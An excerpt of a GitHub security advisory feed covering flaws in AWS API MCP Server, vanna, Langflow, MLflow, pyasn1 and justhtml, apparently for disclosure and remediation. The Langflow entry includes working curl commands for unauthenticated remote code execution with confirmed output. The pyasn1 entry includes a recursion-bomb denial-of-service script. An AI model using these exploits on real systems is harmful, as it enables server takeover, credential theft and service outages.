<p>The AWS API MCP Server is an open source Model Context Protocol (MCP) server that enables AI assistants to interact with AWS services and resources through AWS CLI commands. It provides programmatic access to manage your AWS infrastructure while maintaining proper security controls.</p>
<p>This server acts as a bridge between AI assistants and AWS services, allowing you to create, update, and manage AWS resources across all available services. The server includes a configurable file access feature that controls how AWS CLI commands interact with the local file system. By default, file operations are restricted to a designated working directory (workdir), but this can be configured to allow unrestricted file system access (unrestricted) or to block all local file path arguments entirely (no-access).</p>
<p><strong>Description:</strong> Improper Protection of Alternate Path exists in the no-access and workdir feature of the AWS API MCP Server versions &gt;= 0.2.14 and &lt; 1.3.9 on all platforms may allow the bypass of intended file access restriction and expose arbitrary local file contents in the MCP client application context.</p>
<p>To remediate this issue, users should upgrade to version 1.3.9.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/awslabs/mcp/security/advisories/GHSA-2cpp-j2fc-qhp7">https://github.com/awslabs/mcp/security/advisories/GHSA-2cpp-j2fc-qhp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4270">https://nvd.nist.gov/vuln/detail/CVE-2026-4270</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-007-AWS">https://aws.amazon.com/security/security-bulletins/2026-007-AWS</a></li>
<li><a href="https://pypi.org/project/awslabs.aws-api-mcp-server/1.3.9">https://pypi.org/project/awslabs.aws-api-mcp-server/1.3.9</a></li>
<li><a href="https://github.com/advisories/GHSA-2cpp-j2fc-qhp7">https://github.com/advisories/GHSA-2cpp-j2fc-qhp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2cpp-j2fc-qhp7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T20:33:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vanna] Vanna has a SQL injection in the remove_training_data function]]></title>
        <id>https://github.com/advisories/GHSA-6mj8-jmp2-g8q7</id>
        <link href="https://github.com/advisories/GHSA-6mj8-jmp2-g8q7"/>
        <updated>2026-03-17T20:32:44.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in vanna-ai vanna up to 2.0.2. This impacts the function remove_training_data of the file src/vanna/legacy/google/bigquery_vector.py. This manipulation of the argument ID causes sql injection. The attack can be initiated remotely. The exploit has been published and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4229">https://nvd.nist.gov/vuln/detail/CVE-2026-4229</a></li>
<li><a href="https://gist.github.com/YLChen-007/b4f326eaecc29b192cf93dc5d6bc0623">https://gist.github.com/YLChen-007/b4f326eaecc29b192cf93dc5d6bc0623</a></li>
<li><a href="https://vuldb.com/?ctiid.351152">https://vuldb.com/?ctiid.351152</a></li>
<li><a href="https://vuldb.com/?id.351152">https://vuldb.com/?id.351152</a></li>
<li><a href="https://vuldb.com/?submit.771214">https://vuldb.com/?submit.771214</a></li>
<li><a href="https://github.com/advisories/GHSA-6mj8-jmp2-g8q7">https://github.com/advisories/GHSA-6mj8-jmp2-g8q7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6mj8-jmp2-g8q7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-16T15:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Unauthenticated Remote Code Execution in Langflow via Public Flow Build Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-vwmf-pq79-vjvx</id>
        <link href="https://github.com/advisories/GHSA-vwmf-pq79-vjvx"/>
        <updated>2026-03-17T20:05:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>POST /api/v1/build_public_tmp/{flow_id}/flow</code> endpoint allows building public flows without requiring authentication. When the optional <code>data</code> parameter is supplied, the endpoint uses <strong>attacker-controlled flow data</strong> (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to <code>exec()</code> with zero sandboxing, resulting in unauthenticated remote code execution.</p>
<p>This is distinct from CVE-2025-3248, which fixed <code>/api/v1/validate/code</code> by adding authentication. The <code>build_public_tmp</code> endpoint is <strong>designed</strong> to be unauthenticated (for public flows) but incorrectly accepts attacker-supplied flow data containing arbitrary executable code.</p>
<h2 id="affected-code">Affected Code</h2>
<h3 id="vulnerable-endpoint-no-authentication">Vulnerable Endpoint (No Authentication)</h3>
<p><strong>File:</strong> <code>src/backend/base/langflow/api/v1/chat.py</code>, lines 580-657</p>
<pre><code class="language-python">@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    data: Annotated[FlowDataRequest | None, Body(embed=True)] = None,  # ATTACKER CONTROLLED
    request: Request,
    # ... NO Depends(get_current_active_user) -- MISSING AUTH ...
):
    """Build a public flow without requiring authentication."""
    client_id = request.cookies.get("client_id")
    owner_user, new_flow_id = await verify_public_flow_and_get_user(flow_id=flow_id, client_id=client_id)

    job_id = await start_flow_build(
        flow_id=new_flow_id,
        data=data,  # Attacker's data passed directly to graph builder
        current_user=owner_user,
        ...
    )
</code></pre>
<p>Compare with the authenticated build endpoint at line 138, which requires <code>current_user: CurrentActiveUser</code>.</p>
<h3 id="code-execution-chain">Code Execution Chain</h3>
<p>When attacker-supplied <code>data</code> is provided, it flows through:</p>
<ol>
<li><code>start_flow_build(data=attacker_data)</code> → <code>generate_flow_events()</code> -- <code>build.py:81</code></li>
<li><code>create_graph()</code> → <code>build_graph_from_data(payload=data.model_dump())</code> -- <code>build.py:298</code></li>
<li><code>Graph.from_payload(payload)</code> parses attacker nodes -- <code>base.py:1168</code></li>
<li><code>add_nodes_and_edges()</code> → <code>initialize()</code> → <code>_build_graph()</code> -- <code>base.py:270,527</code></li>
<li><code>_instantiate_components_in_vertices()</code> iterates nodes -- <code>base.py:1323</code></li>
<li><code>vertex.instantiate_component()</code> → <code>instantiate_class(vertex)</code> -- <code>loading.py:28</code></li>
<li><code>code = custom_params.pop("code")</code> extracts attacker code -- <code>loading.py:43</code></li>
<li><code>eval_custom_component_code(code)</code> → <code>create_class(code, class_name)</code> -- <code>eval.py:9</code></li>
<li><code>prepare_global_scope(module)</code> -- <code>validate.py:323</code></li>
<li><code>exec(compiled_code, exec_globals)</code> -- <strong>ARBITRARY CODE EXECUTION</strong> -- <code>validate.py:397</code></li>
</ol>
<h3 id="unsandboxed-exec-in-prepare_global_scope">Unsandboxed exec() in prepare_global_scope</h3>
<p><strong>File:</strong> <code>src/lfx/src/lfx/custom/validate.py</code>, lines 340-397</p>
<pre><code class="language-python">def prepare_global_scope(module):
    exec_globals = globals().copy()

    # Imports are resolved first (any module can be imported)
    for node in imports:
        module_obj = importlib.import_module(module_name)  # line 352
        exec_globals[variable_name] = module_obj

    # Then ALL top-level definitions are executed (Assign, ClassDef, FunctionDef)
    if definitions:
        combined_module = ast.Module(body=definitions, type_ignores=[])
        compiled_code = compile(combined_module, "&lt;string&gt;", "exec")
        exec(compiled_code, exec_globals)  # line 397 - ARBITRARY CODE EXECUTION
</code></pre>
<p><strong>Critical detail:</strong> <code>prepare_global_scope</code> executes <code>ast.Assign</code> nodes. An attacker's code like <code>_x = os.system("id")</code> is an assignment and will be executed during graph building -- before the flow even "runs."</p>
<h2 id="prerequisites">Prerequisites</h2>
<ol>
<li>Target Langflow instance has at least <strong>one public flow</strong> (common for demos, chatbots, shared workflows)</li>
<li>Attacker knows the public flow's UUID (discoverable via shared links/URLs)</li>
<li>No authentication required -- only a <code>client_id</code> cookie (any arbitrary string value)</li>
</ol>
<p>When <code>AUTO_LOGIN=true</code> (the <strong>default</strong>), all prerequisites can be met by an unauthenticated attacker:</p>
<ol>
<li><code>GET /api/v1/auto_login</code> → obtain superuser token</li>
<li><code>POST /api/v1/flows/</code> → create a public flow</li>
<li>Exploit via <code>build_public_tmp</code> without any auth</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="tested-against">Tested Against</h3>
<ul>
<li><strong>Langflow version 1.7.3</strong> (latest stable release, installed via <code>pip install langflow</code>)</li>
<li><strong>Fully reproducible</strong>: 6/6 runs confirmed RCE (two sets of 3 runs each)</li>
</ul>
<h3 id="step-1-obtain-a-public-flow-id">Step 1: Obtain a Public Flow ID</h3>
<p>(In a real attack, the attacker discovers this via shared links. For the PoC, we create one via AUTO_LOGIN.)</p>
<pre><code class="language-bash"># Get superuser token (no credentials needed when AUTO_LOGIN=true)
TOKEN=$(curl -s http://localhost:7860/api/v1/auto_login | jq -r '.access_token')

# Create a public flow
FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}' \
  | jq -r '.id')

echo "Public Flow ID: $FLOW_ID"
</code></pre>
<h3 id="step-2-exploit----unauthenticated-rce">Step 2: Exploit -- Unauthenticated RCE</h3>
<pre><code class="language-bash"># EXPLOIT: Send malicious flow data to the UNAUTHENTICATED endpoint
# NO Authorization header, NO API key, NO credentials
curl -X POST "http://localhost:7860/api/v1/build_public_tmp/${FLOW_ID}/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=attacker" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os, socket, json as _json\n\n_proof = os.popen(\"id\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)-&gt;Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    },
    "inputs": null
  }'
</code></pre>
<h3 id="step-3-verify-code-execution">Step 3: Verify Code Execution</h3>
<pre><code class="language-bash"># Wait 2 seconds for async graph building
sleep 2

# Check proof file written by attacker's code on the server
cat /tmp/rce-proof
# Output: uid=1000(aviral) gid=1000(aviral) groups=... on kali
</code></pre>
<h3 id="actual-test-results">Actual Test Results</h3>
<pre><code>======================================================================
LANGFLOW v1.7.3 UNAUTHENTICATED RCE - DEFINITIVE E2E TEST
======================================================================
Version:  Langflow 1.7.3

RUN 1: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d8db19bf-a532-4f9d-a368-9c46d6235c19
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-f0d19b36
    hostname: kali
    uid: 1000
    whoami: aviral
    id: uid=1000(aviral) gid=1000(aviral) groups=1000(aviral),...
    uname: Linux 6.16.8+kali-amd64

RUN 2: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d2e24f20-d707-4278-868c-583dd7532832
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-6037a271

RUN 3: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: 5962244a-42af-4ef6-b134-a6a4adba5ab7
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-4a796556

FINAL RESULTS
  Total checks:   15
  VULNERABLE:     15
  SAFE:           0
  RCE confirmed:  3/3 runs
  Reproducible:   YES (100%)
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Unauthenticated Remote Code Execution</strong> with full server process privileges</li>
<li><strong>Complete server compromise</strong>: arbitrary file read/write, command execution</li>
<li><strong>Environment variable exfiltration</strong>: API keys, database credentials, cloud tokens (confirmed in PoC: env_keys exfiltrated)</li>
<li><strong>Reverse shell access</strong> for persistent access</li>
<li><strong>Lateral movement</strong> within the network</li>
<li><strong>Data exfiltration</strong> from all flows, messages, and stored credentials in the database</li>
</ul>
<h2 id="comparison-with-cve-2025-3248">Comparison with CVE-2025-3248</h2>
<table>
<thead>
<tr>
<th>Aspect</th>
<th>CVE-2025-3248</th>
<th>This Vulnerability</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Endpoint</strong></td>
<td><code>/api/v1/validate/code</code></td>
<td><code>/api/v1/build_public_tmp/{id}/flow</code></td>
</tr>
<tr>
<td><strong>Fix applied</strong></td>
<td>Added <code>Depends(get_current_active_user)</code></td>
<td>None -- NEW vulnerability</td>
</tr>
<tr>
<td><strong>Root cause</strong></td>
<td>Missing auth on code validation</td>
<td>Unauthenticated endpoint accepts attacker-controlled executable code via <code>data</code> param</td>
</tr>
<tr>
<td><strong>Code execution via</strong></td>
<td><code>validate_code()</code> → <code>exec()</code></td>
<td><code>create_class()</code> → <code>prepare_global_scope()</code> → <code>exec()</code></td>
</tr>
<tr>
<td><strong>CISA KEV</strong></td>
<td>Yes (actively exploited)</td>
<td>N/A (new finding)</td>
</tr>
<tr>
<td><strong>Can simple auth fix?</strong></td>
<td>Yes (and it was fixed)</td>
<td>No -- endpoint is <em>designed</em> to be unauthenticated; the <code>data</code> parameter must be removed</td>
</tr>
</tbody></table>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="immediate-short-term">Immediate (Short-term)</h3>
<p><strong>Remove the <code>data</code> parameter</strong> from <code>build_public_tmp</code>. Public flows should only execute their stored flow data, never attacker-supplied data:</p>
<pre><code class="language-python">@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    inputs: Annotated[InputValueRequest | None, Body(embed=True)] = None,
    # REMOVED: data parameter -- public flows must use stored data only
    ...
):
</code></pre>
<p>In <code>generate_flow_events</code> → <code>create_graph()</code>, only the <code>build_graph_from_db</code> path should be reachable for unauthenticated requests:</p>
<pre><code class="language-python">async def create_graph(fresh_session, flow_id_str, flow_name):
    # For public flows, ALWAYS load from database, never from user data
    return await build_graph_from_db(
        flow_id=flow_id,
        session=fresh_session,
        ...
    )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx">https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx</a></li>
<li><a href="https://github.com/advisories/GHSA-vwmf-pq79-vjvx">https://github.com/advisories/GHSA-vwmf-pq79-vjvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwmf-pq79-vjvx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-17T20:05:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow Tracking Server Artifact Handler Directory Traversal Remote Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q2r8-vmq7-fpx2</id>
        <link href="https://github.com/advisories/GHSA-q2r8-vmq7-fpx2"/>
        <updated>2026-03-17T20:03:09.000Z</updated>
        <content type="html"><![CDATA[<p>MLflow Tracking Server Artifact Handler Directory Traversal Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of MLflow Tracking Server. Authentication is not required to exploit this vulnerability.</p>
<p>The specific flaw exists within the handling of artifact file paths. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to execute code in the context of the service account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2033">https://nvd.nist.gov/vuln/detail/CVE-2026-2033</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/19260">https://github.com/mlflow/mlflow/pull/19260</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-26-105">https://www.zerodayinitiative.com/advisories/ZDI-26-105</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/5bf2ec2bd4222a18d78631183ac7f6b752afe8a4">https://github.com/mlflow/mlflow/commit/5bf2ec2bd4222a18d78631183ac7f6b752afe8a4</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0">https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0</a></li>
<li><a href="https://github.com/advisories/GHSA-q2r8-vmq7-fpx2">https://github.com/advisories/GHSA-q2r8-vmq7-fpx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q2r8-vmq7-fpx2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-21T00:31:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow Use of Default Password Authentication Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-gq3w-7jj3-x7gr</id>
        <link href="https://github.com/advisories/GHSA-gq3w-7jj3-x7gr"/>
        <updated>2026-03-17T20:02:56.000Z</updated>
        <content type="html"><![CDATA[<p>This vulnerability allows remote attackers to bypass authentication on affected installations of MLflow. Authentication is not required to exploit this vulnerability.</p>
<p>The specific flaw exists within the basic_auth.ini file. The file contains hard-coded default credentials. An attacker can leverage this vulnerability to bypass authentication and execute arbitrary code in the context of the administrator.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2635">https://nvd.nist.gov/vuln/detail/CVE-2026-2635</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/19260">https://github.com/mlflow/mlflow/pull/19260</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-26-111">https://www.zerodayinitiative.com/advisories/ZDI-26-111</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/5bf2ec2bd4222a18d78631183ac7f6b752afe8a4">https://github.com/mlflow/mlflow/commit/5bf2ec2bd4222a18d78631183ac7f6b752afe8a4</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0">https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0</a></li>
<li><a href="https://github.com/advisories/GHSA-gq3w-7jj3-x7gr">https://github.com/advisories/GHSA-gq3w-7jj3-x7gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gq3w-7jj3-x7gr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-02-21T00:31:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow has a command injection in mlflow/sagemaker/__init__.py]]></title>
        <id>https://github.com/advisories/GHSA-xch3-2f9x-wh9f</id>
        <link href="https://github.com/advisories/GHSA-xch3-2f9x-wh9f"/>
        <updated>2026-03-17T19:53:10.000Z</updated>
        <content type="html"><![CDATA[<p>A command injection vulnerability exists in mlflow/mlflow versions before v3.7.0, specifically in the <code>mlflow/sagemaker/__init__.py</code> file at lines 161-167. The vulnerability arises from the direct interpolation of user-supplied container image names into shell commands without proper sanitization, which are then executed using <code>os.system()</code>. This allows attackers to execute arbitrary commands by supplying malicious input through the <code>--container</code> parameter of the CLI. The issue affects environments where MLflow is used, including development setups, CI/CD pipelines, and cloud deployments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14287">https://nvd.nist.gov/vuln/detail/CVE-2025-14287</a></li>
<li><a href="https://huntr.com/bounties/229cd526-41aa-4819-b6f0-e2d0371c89e3">https://huntr.com/bounties/229cd526-41aa-4819-b6f0-e2d0371c89e3</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/19277">https://github.com/mlflow/mlflow/pull/19277</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/8b8792a7034fb33a14b0b31cabcaa9b912d3485f">https://github.com/mlflow/mlflow/commit/8b8792a7034fb33a14b0b31cabcaa9b912d3485f</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0">https://github.com/mlflow/mlflow/releases/tag/v3.8.0rc0</a></li>
<li><a href="https://github.com/advisories/GHSA-xch3-2f9x-wh9f">https://github.com/advisories/GHSA-xch3-2f9x-wh9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xch3-2f9x-wh9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T15:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyasn1] Denial of Service in pyasn1 via Unbounded Recursion]]></title>
        <id>https://github.com/advisories/GHSA-jr27-m4p2-rc6r</id>
        <link href="https://github.com/advisories/GHSA-jr27-m4p2-rc6r"/>
        <updated>2026-03-17T16:17:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>pyasn1</code> library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested <code>SEQUENCE</code> (<code>0x30</code>) or <code>SET</code> (<code>0x31</code>) tags with Indefinite Length (<code>0x80</code>) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a <code>RecursionError</code> or consumes all available memory (OOM), crashing the host application.</p>
<p>This is a distinct vulnerability from CVE-2026-23490 (which addressed integer overflows in OID decoding). The fix for CVE-2026-23490 (<code>MAX_OID_ARC_CONTINUATION_OCTETS</code>) does not mitigate this recursion issue.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists because the decoder iterates through the input stream and recursively calls <code>decodeFun</code> (the decoding callback) for every nested component found, without tracking or limiting the recursion depth.
Vulnerable Code Locations:</p>
<ol>
<li><code>indefLenValueDecoder</code> (Line 998):</li>
</ol>
<p><code>for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):</code>
This method handles indefinite-length constructed types. It sits inside a <code>while True</code> loop and recursively calls the decoder for every nested tag.</p>
<ol start="2">
<li><code>valueDecoder</code> (Lines 786 and 907):</li>
</ol>
<p><code>for component in decodeFun(substrate, componentType, **options):</code>
This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of <code>SEQUENCE</code> or <code>SET</code> types. Line 907: Recursively decodes elements of <code>SEQUENCE OF</code> or <code>SET OF</code> types.</p>
<ol start="4">
<li><code>_decodeComponentsSchemaless</code> (Line 661):</li>
</ol>
<p><code>for component in decodeFun(substrate, **options):</code>
This method handles decoding when no schema is provided.</p>
<p>In all three cases, <code>decodeFun</code> is invoked without passing a <code>depth</code> parameter or checking against a global <code>MAX_ASN1_NESTING</code> limit.</p>
<h3 id="poc">PoC</h3>
<pre><code>import sys
from pyasn1.codec.ber import decoder

sys.setrecursionlimit(100000)

print("[*] Generating Recursion Bomb Payload...")
depth = 50_000
chunk = b'\x30\x80' 
payload = chunk * depth

print(f"[*] Payload size: {len(payload) / 1024:.2f} KB")
print("[*] Triggering Decoder...")

try:
    decoder.decode(payload)
except RecursionError:
    print("[!] Crashed: Recursion Limit Hit")
except MemoryError:
    print("[!] Crashed: Out of Memory")
except Exception as e:
    print(f"[!] Crashed: {e}")
</code></pre>
<pre><code>[*] Payload size: 9.77 KB
[*] Triggering Decoder...
[!] Crashed: Recursion Limit Hit
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (&lt;100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion.</li>
<li>Service Crash: Any service using <code>pyasn1</code> to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.</li>
<li>Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (&lt;200KB) can consume hundreds of megabytes of RAM or exhaust the stack.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Vulnerability discovered by Kevin Tu of TMIR at ByteDance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyasn1/pyasn1/security/advisories/GHSA-jr27-m4p2-rc6r">https://github.com/pyasn1/pyasn1/security/advisories/GHSA-jr27-m4p2-rc6r</a></li>
<li><a href="https://github.com/pyasn1/pyasn1/commit/5a49bd1fe93b5b866a1210f6bf0a3924f21572c8">https://github.com/pyasn1/pyasn1/commit/5a49bd1fe93b5b866a1210f6bf0a3924f21572c8</a></li>
<li><a href="https://github.com/pyasn1/pyasn1/releases/tag/v0.6.3">https://github.com/pyasn1/pyasn1/releases/tag/v0.6.3</a></li>
<li><a href="https://github.com/advisories/GHSA-jr27-m4p2-rc6r">https://github.com/advisories/GHSA-jr27-m4p2-rc6r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr27-m4p2-rc6r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T16:17:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] Uncontrolled recursion DoS in JustHTML() via deeply nested HTML]]></title>
        <id>https://github.com/advisories/GHSA-v7cf-c9rm-wm3j</id>
        <link href="https://github.com/advisories/GHSA-v7cf-c9rm-wm3j"/>
        <updated>2026-03-17T14:07:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>justhtml through 1.9.1 allows denial of service via deeply nested HTML. During parsing, <code>JustHTML.__init__()</code> always reaches <code>TreeBuilder.finish()</code>, which unconditionally calls <code>_populate_selectedcontent()</code>. That function recursively traverses the DOM via <code>_find_elements()</code> / <code>_find_element()</code> without a depth bound, allowing attacker-controlled deeply nested input to trigger an unhandled <code>RecursionError</code> on CPython. Depending on the host application's exception handling, this can abort parsing, fail requests, or terminate a worker/process.</p>
<h3 id="details">Details</h3>
<p><code>TreeBuilder.finish()</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/treebuilder.py#L476"><code>treebuilder.py#L476</code></a>) unconditionally calls <code>_populate_selectedcontent(self.document)</code> at <a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/treebuilder.py#L494">line 494</a>. <code>_populate_selectedcontent()</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/treebuilder.py#L1243"><code>treebuilder.py#L1243</code></a>) calls <code>_find_elements()</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/treebuilder.py#L1280"><code>treebuilder.py#L1280</code></a>) to recursively search the DOM tree for <code>&lt;select&gt;</code> elements:</p>
<pre><code class="language-python">def _find_elements(self, node: Any, name: str, result: list[Any]) -&gt; None:
    """Recursively find all elements with given name."""
    if node.name == name:
        result.append(node)
    if node.has_child_nodes():
        for child in node.children:
            self._find_elements(child, name, result)  # recursive call
</code></pre>
<p>When the DOM tree depth exceeds CPython's default recursion limit (1000), this raises an unhandled <code>RecursionError</code>. The full call path is:</p>
<p><code>JustHTML(html)</code> → <code>tokenizer.run()</code> → <code>tree_builder.finish()</code> → <code>_populate_selectedcontent(document)</code> → <code>_find_elements(root, "select", selects)</code> (recursive)</p>
<p>Deeply nested DOM trees can be produced by nesting <code>&lt;div&gt;</code> tags ~1000 levels deep. On CPython with the default recursion limit, approximately 11 KB of <code>&lt;div&gt;</code> nesting is sufficient to trigger the error. The exact depth threshold is environment-dependent (CPython version, recursion limit setting, call stack depth at invocation).</p>
<p>Additional recursive functions are affected on already-parsed deep trees:</p>
<ul>
<li><code>Node.clone_node(deep=True)</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/node.py#L523"><code>node.py#L523</code></a>) — called during sanitization</li>
<li><code>_node_to_html()</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/serialize.py#L580"><code>serialize.py#L580</code></a>) — used by <code>to_html(pretty=True)</code></li>
<li><code>_to_markdown_walk()</code> (<a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/node.py#L817"><code>node.py#L817</code></a>) — used by <code>to_markdown()</code></li>
</ul>
